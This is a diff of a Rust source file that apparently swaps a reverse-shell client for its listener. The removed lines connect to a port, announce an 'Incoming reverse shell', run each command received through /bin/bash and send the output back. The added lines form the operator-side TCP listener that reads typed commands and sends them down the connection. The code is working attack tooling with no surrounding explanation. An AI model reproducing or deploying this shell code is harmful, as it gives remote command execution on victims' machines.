@@ -1,76 +1,72 @@
-use std::io::{Read, Write};
+use std::io::{stdin, Read, Write};
+
 use std::net::{
     IpAddr,
     Ipv4Addr,
     SocketAddr,
+    TcpListener,
     TcpStream
 };
-use std::process::Command;
+use std::thread;
 
 fn main() {
-    // Target IP
-    let target_ip = IpAddr::V4(
+    // Listening IP
+    let localhost_v4 = IpAddr::V4(
         Ipv4Addr::new(127, 0, 0, 1)
     );
 
-    // Target Port
-    let target_port: u16 = 1234;
+    // Listening port
+    let port = 1234;
 
-    // Create Socket
-    let socket = SocketAddr::new(target_ip, target_port);
+    // Create socket
+    let socket = SocketAddr::new(localhost_v4, port);
 
-    // Bind socket
-    let mut tcpstream = TcpStream::connect(socket)
-        .expect(":: [-] :: Cannot bind socket");
+    // Bind socket to listener
+    let listener = TcpListener::bind(socket)
+        .expect(":: [-] :: Bind socket");
 
-    // Send initial message
-    let msg = b":: [i] :: Incoming reverse shell\n> ";
-    tcpstream.write_all(msg)
-        .expect(":: [-] :: Write stream");
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                thread::spawn(|| handle_connection(stream));
+            }
+            Err(err) => {
+                eprintln!(":: [-] :: Print error :: {err}");
+            }
+        }
+    }
+}
 
+fn handle_connection(mut stream: TcpStream) {
     loop {
-        println!(":: [i] :: Waiting for incoming data");
-
         // Create buffer
         let mut buffer = [0; 1024];
 
-        // Read TcpStream
-        match tcpstream.read(&mut buffer) {
-            Ok(0) => {
-                // Exit 0 recieved bytes
-                eprintln!(":: [-] :: Connection closed by peer");
-                std::process::exit(1);
-            }
+        // Pull stream bytes into buffer
+        match stream.read(&mut buffer){
             Ok(bytes_read) => {
-                // Convert bytes to String
-                let incoming = String::from_utf8_lossy(&buffer[..bytes_read]);
-                let cmd = incoming.trim();
-                println!(":: [i] :: Incoming data :: {cmd}");
-
-                // Execute command and arguments
-                let output = Command::new("/bin/bash")
-                    .arg("-c")
-                    .arg(cmd)
-                    .output()
-                    .expect(":: [-] :: Execute command");
-
-                // Convert ouptut to String
-                let mut response = String::from_utf8_lossy(&output.stdout).to_string();
-
-                // Push cmd line
-                response.push_str("> ");
-
-                // Write response to TcpStream
-                if let Err(err) = tcpstream.write_all(response.as_bytes()) {
-                    eprintln!(":: [-] :: Write stream :: {err}");
+                if bytes_read == 0 {
+                    println!(":: [-] :: Connection closed by peer");
+                } else {
+                    println!(
+                        ":: [i] :: Incoming data :: \n{}",
+                        String::from_utf8_lossy(&buffer[..bytes_read])
+                    );
                 }
-
-                // Flush output stream
-                tcpstream.flush().expect(":: [-] :: Flush stream");
             }
             Err(err) => {
                 eprintln!(":: [-] :: Read stream :: {err}");
             }
         }
+
+        // Get input
+        let mut input = String::new();
+
+        std::io::stdin()
+            .read_line(&mut input)
+            .expect(":: [-] :: Cannot read input");
+
+        stream.write_all(input.as_bytes())
+            .expect(":: [-] :: Failed to write to stream")
     }
 }
